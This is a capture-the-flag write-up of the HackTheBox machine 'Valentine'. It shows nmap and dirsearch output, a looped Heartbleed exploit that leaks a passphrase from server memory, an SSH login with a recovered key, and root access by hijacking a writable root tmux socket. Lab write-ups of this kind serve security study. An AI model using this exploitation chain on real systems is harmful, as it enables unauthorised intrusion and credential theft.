# Valentine | HackTheBox

### 1. Scan
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ sudo nmap -A -p- -T4 10.129.148.249
Nmap scan report for 10.129.148.249
Host is up, received echo-reply ttl 63 (0.30s latency).
Scanned at 2021-05-22 02:10:45 EDT for 2136s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIMeSqrDdAOhxf7P1IDtdRqun0pO9pmUi+474hX6LHkDgC9dzcvEGyMB/cuuCCjfXn6QDd1n16dSE2zeKKjYT9RVCXJqfYvz/ROm82p0JasEdg1z6QHTeAv70XX6cVQAjAMQoUUdF7WWKWjQuAknb4uowunpQ0yGvy72rbFkSTmlAAAAFQDwWVA5vTpfj5pUCUNFyvnhy3TdcQAAAIBFqVHk74mIT3PWKSpWcZvllKCGg5rGCCE5B3jRWEbRo8CPRkwyPdi/hSaoiQYhvCIkA2CWFuAeedsZE6zMFVFVSsHxeMe55aCQclfMH4iuUZWrg0y5QREuRbGFM6DATJJFkg+PXG/OsLsba/BP8UfcuPM+WGWKxjuaoJt6jeD8iQAAAIBg9rgf8NoRfGqzi+3ndUCo9/m+T18pn+ORbCKdFGq8Ecs4QLeaXPMRIpCol11n6va090EISDPetHcaMaMcYOsFqO841K0O90BV8DhyU4JYBjcpslT+A2X+ahj2QJVGqZJSlusNAQ9vplWxofFONa+IUSGl1UsGjY0QGsA5l5ohfQ==
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRkMHjbGnQ7uoYx7HPJoW9Up+q0NriI5g5xAs1+0gYBVtBqPxi86gPtXbMHGSrpTiX854nsOPWA8UgfBOSZ2TgWeFvmcnRfUKJG9GR8sdIUvhKxq6ZOtUePereKr0bvFwMSl8Qtmo+KcRWvuxKS64RgUem2TVIWqStLJoPxt8iDPPM7929EoovpooSjwPfqvEhRMtq+KKlqU6PrJD6HshGdjLjABYY1ljfKakgBfWic+Y0KWKa9qdeBF09S7WlaUBWJ5SutKlNSwcRBBVbL4ZFcHijdlXCvfVwSVMkiqY7x4V4McsNpIzHyysZUADy8A6tbfSgopaeR2UN4QRgM1dX
|   256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+pCNI5Xv8P96CmyDi/EIvyL0LVZY2xAUJcA0G9rFdLJnIhjvmYuxoCQDsYl+LEiKQee5RRw9d+lgH3Fm5O9XI=
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-02-06T00:45:25
| Not valid after:  2019-02-06T00:45:25
| MD5:   a413 c4f0 b145 2154 fb54 b2de c7a9 809d
| SHA-1: 2303 80da 60e7 bde7 2ba6 76dd 5214 3c3c 6f53 01b1
| -----BEGIN CERTIFICATE-----
| MIIDZzCCAk+gAwIBAgIJAIXsbfXFhLHyMA0GCSqGSIb3DQEBBQUAMEoxCzAJBgNV
| BAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50aW5lLmh0YjEWMBQG
| A1UEAwwNdmFsZW50aW5lLmh0YjAeFw0xODAyMDYwMDQ1MjVaFw0xOTAyMDYwMDQ1
| MjVaMEoxCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50
| aW5lLmh0YjEWMBQGA1UEAwwNdmFsZW50aW5lLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMMoF6z4GSpB0oo/znkcGfT7SPrTLzNrb8ic+aO/GWao
| oY35ImIO4Z5FUB9ZL6y6lc+vI6pUyWRADyWoxd3LxByHDNJzEi53ds+JSPs5SuH1
| PUDDtZqCaPaNjLJNP08DCcC6rXRdU2SwV2pEDx+39vsFiK6ywcrepvvFZndGKXVg
| 0K+R3VkwOguPhSHlXcgiHFbqei8NJ1zip9YuVUYXhyLVG2ZiJYX6CRw4bRsUnql6
| 4DFNQybOsJHm0JtI2M9PefmvEkTUZeT/d0dWhU076a3bTestKZf4WpqZw60XGmxz
| pAQf5dWOqMemIK6K4FC48bLSSN59s4kNtuhtx6OCXpcCAwEAAaNQME4wHQYDVR0O
| BBYEFNzWWyJscuATyFWyfLR2Yev1T435MB8GA1UdIwQYMBaAFNzWWyJscuATyFWy
| fLR2Yev1T435MAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBACc3NjB7
| cHUXjTxwdeFxkY0EFYPPy3EiHftGVLpiczrEQ7NiHTLGQ6apvxdlShBBhKWRaU+N
| XGhsDkvBLUWJ3DSWwWM4pG9qmWPT241OCaaiIkVT4KcjRIc+x+91GWYNQvvdnFLO
| 5CfrRGkFHwJT1E6vGXJejx6nhTmis88ByQ9g9D2NgcHENfQPAW1by7ONkqiXtV3S
| q56X7q0yLQdSTe63dEzK8eSTN1KWUXDoNRfAYfHttJqKg2OUqUDVWkNzmUiIe4sP
| csAwIHShdX+Jd8E5oty5C07FJrzVtW+Yf4h8UHKLuJ4E8BYbkxkc5vDcXnKByeJa
| gRSFfyZx/VqBh9c=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-05-22T06:46:19+00:00; -1s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=5/22%OT=22%CT=1%CU=31912%PV=Y%DS=2%DC=T%G=Y%TM=60A8A8B
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=8)OPS
OS:(O1=M54DST11NW4%O2=M54DST11NW4%O3=M54DNNT11NW4%O4=M54DST11NW4%O5=M54DST1
OS:1NW4%O6=M54DST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN
OS:(R=Y%DF=Y%T=40%W=3908%O=M54DNNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M54DST11NW4%RD=
OS:0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.039 days (since Sat May 22 01:50:26 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   301.54 ms 10.10.14.1
2   301.50 ms 10.129.148.249

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 22 02:46:21 2021 -- 1 IP address (1 host up) scanned in 2136.91 seconds
```

### 2. Enumneration
Browsing to the web server on 80 there is a image of a bleeding heart and a cartoon woman screaming. The bleeding heart symbol is associated with the Heartbleed bug from 2014, as detailed at https://heartbleed.com/.
  
Performing directory bruteforcing on both HTTP and HTTPS ports show the same results.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ dirsearch -u http://10.129.148.249                                                                             

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra-Tools/dirsearch/logs/errors-21-05-22_03-23-01.log

Target: http://10.129.148.249/

Output File: /home/kali/Extra-Tools/dirsearch/reports/10.129.148.249/_21-05-22_03-23-02.txt

[03:23:02] Starting: 
[03:23:14] 403 -  293B  - /.ht_wsr.txt                                                                                                  
[03:23:14] 403 -  296B  - /.htaccess.bak1
[03:23:14] 403 -  296B  - /.htaccess.orig
[03:23:14] 403 -  298B  - /.htaccess.sample
[03:23:14] 403 -  296B  - /.htaccess.save
[03:23:14] 403 -  294B  - /.htaccessBAK
[03:23:14] 403 -  294B  - /.htaccessOLD
[03:23:14] 403 -  295B  - /.htaccessOLD2
[03:23:14] 403 -  297B  - /.htaccess_extra
[03:23:14] 403 -  296B  - /.htaccess_orig
[03:23:14] 403 -  294B  - /.htaccess_sc
[03:23:14] 403 -  286B  - /.htm
[03:23:14] 403 -  287B  - /.html
[03:23:14] 403 -  292B  - /.htpasswds
[03:23:14] 403 -  296B  - /.htpasswd_test
[03:23:14] 403 -  293B  - /.httr-oauth
[03:23:59] 403 -  290B  - /cgi-bin/                                                                               
[03:24:07] 301 -  314B  - /dev  ->  http://10.129.148.249/dev/                    
[03:24:07] 200 -    1KB - /dev/       
[03:24:07] 403 -  286B  - /doc/                         
[03:24:07] 403 -  290B  - /doc/api/
[03:24:07] 403 -  301B  - /doc/en/changes.html
[03:24:07] 403 -  300B  - /doc/stable.version    
[03:24:17] 200 -   38B  - /index                                                                               
[03:24:17] 200 -   38B  - /index.php     
[03:24:17] 200 -   38B  - /index.php/login/
[03:24:41] 403 -  295B  - /server-status                                                                
[03:24:41] 403 -  296B  - /server-status/
```
The /dev directory contains notes.txt and hype_key.  
Notes.txt:
```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```
The hype_key file contains a large set of hex-encoded data. In cyberchef, this decodes to an RSA public key (see hype_privkey). But since it is encrypted there is also a password that is needed to use it.

### 3. Exploit Heartbleed
Using the exploit at https://gist.github.com/eelsivart/10174134 to test and then connect to the machine.
```bash
defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.129.148.249:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.129.148.249:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#..........#bQ3.#...N.Oq.?
```
The tool allows the exploit to run in a loop to continually extract data from the server memory. Using this to run the exploit over and over, useful-looking info is eventually recovered.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop/10174134]
└─$ ./heartbleed.py 10.129.148.249 -n 100

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.129.148.249:443, 100 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.129.148.249:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 100 of 100
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..n(....Hg..Z..\.@....SC[...r....+..H...9...
```
This extracted data hints at the presence of a /decode.php page on the web server. This must be the decoder being talked about in the notes.

### 4. Get a shell
Using the decoder, the base64-encoded "text" variable can be decoded. The webpage shows:
```
Your input:

aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==

Your encoded input:

heartbleedbelievethehype 
```
I don't know the username for this key, but a guess can be made based on the name of the "hype_key" file.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ ssh -i hype_privkey hype@10.129.148.249                                                                                                                                                                                                                                        130 ⨯
Enter passphrase for key 'hype_privkey': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
```

### 5. Enumerate from foothold
Looking at running processes, there is a root tmux session.
```bash
hype@Valentine:~$ ps -aux
root       1185  0.0  0.0  19976   968 tty4     Ss+  May21   0:00 /sbin/getty -8 38400 tty4
root       1193  0.0  0.0  19976   972 tty5     Ss+  May21   0:00 /sbin/getty -8 38400 tty5
root       1195  0.0  0.1  26416  1672 ?        Ss   May21   0:03 /usr/bin/tmux -S /.devs/dev_sess
root       1200  0.0  0.4  20652  4584 pts/9    Ss+  May21   0:00 -bash
root       1212  0.0  0.0  19976   976 tty2     Ss+  May21   0:00 /sbin/getty -8 38400 tty2
root       1213  0.0  0.0  19976   976 tty3     Ss+  May21   0:00 /sbin/getty -8 38400 tty3
root       1217  0.0  0.0  19976   976 tty6     Ss+  May21   0:00 /sbin/getty -8 38400 tty6
```
This session file is owned by the hype group and writeable.
```bash
hype@Valentine:/devs$ ls -la /.devs/dev_sess
srw-rw---- 1 root hype 0 May 21 22:47 /.devs/dev_sess
```

### 6. Escalate to root
Reference: https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0  
  
Attach to the session by running `hype@Valentine:~$ tmux -S /.devs/dev_sess`.   
The tmux session fills the window, and allows access to a shell as the root user.
```bash
root@Valentine:/devs# whoami
root
```